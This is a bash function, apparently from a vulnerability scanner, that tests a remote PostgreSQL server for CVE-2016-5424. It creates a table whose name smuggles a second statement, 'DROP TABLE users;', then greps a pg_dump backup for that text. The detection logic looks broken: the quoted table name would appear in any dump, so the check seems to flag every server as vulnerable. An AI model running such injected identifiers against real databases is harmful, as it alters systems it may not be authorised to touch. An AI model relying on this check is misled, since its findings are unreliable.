#!/bin/bash

cve_2016_5424() {
    local target_ip=$1
    local username=$2
    local database=$3

    local backup="backup.sql"

    echo -e "${YELLOW}[*] Checking CVE-2016-5424: SQL Injection in pg_dump...${RESET}"

    # Create malicious table with SQL injection
    psql -h "$target_ip" -U "$username" -d "$database" -c "CREATE TABLE \"test; DROP TABLE users;\" (id SERIAL);" &>/dev/null

    # Run pg_dump
    pg_dump -h "$target_ip" -U "$username" -d "$database" > "$backup"


    if grep -q "DROP TABLE users;" "$backup"; then
        echo -e "${RED}[!] Vulnerable to CVE-2016-5424!${RESET}"
        local NAME="CVE-2016-5424"
        local DESCRIPTION="SQL Injection in pg_dump"
        local SEVERITY="HIGH"
        local SCORE="7.5"

        vulnerabilities+=("$NAME|$DESCRIPTION|$SEVERITY|$SCORE|0")

    else
        echo -e "${GREEN}[+] Not vulnerable to CVE-2016-5424.${RESET}"
    fi

    psql -h "$target_ip" -U "$username" -d "$database" -c "DROP TABLE \"test; DROP TABLE users;\";" &>/dev/null
}
